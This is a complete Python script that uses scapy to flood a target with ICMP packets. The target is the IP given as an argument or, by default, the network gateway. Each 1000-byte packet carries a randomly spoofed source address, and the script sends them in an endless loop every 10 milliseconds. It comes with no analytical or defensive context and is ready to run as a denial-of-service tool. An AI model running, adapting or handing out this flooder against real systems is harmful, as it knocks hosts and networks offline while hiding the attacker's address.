#!/usr/bin/env python

import sys
import os
sys.stderr = None 
from scapy.all import *
sys.stderr = sys.__stderr__
import netifaces
import time

def check_root():
    if os.geteuid() != 0:
        print("Script must run as root")
        sys.exit(1)

def get_gateway_ip():
    try:
        gateways = netifaces.gateways()
        default_gateway = gateways['default'][netifaces.AF_INET][0]
        return default_gateway
    except (KeyError, IndexError):
        return None

def icmp_flood(dest_ip):
    s_addr = RandIP()
    packet = IP(src=s_addr, dst=dest_ip) / ICMP() / Raw(load=b'X' * 1000)
    send(packet, verbose=0)


def main():
    check_root()

    victim_ip = sys.argv[1] if len(sys.argv) > 1 else get_gateway_ip()

    print("Start ICMP flood")
    print("Target IP:", victim_ip)
    
    try:
        print("To stop press CTRL+C")
        while True:
            icmp_flood(victim_ip)
            time.sleep(0.01)
    except KeyboardInterrupt:
        print("\nICMP flood stoped")

if __name__ == "__main__":
    main()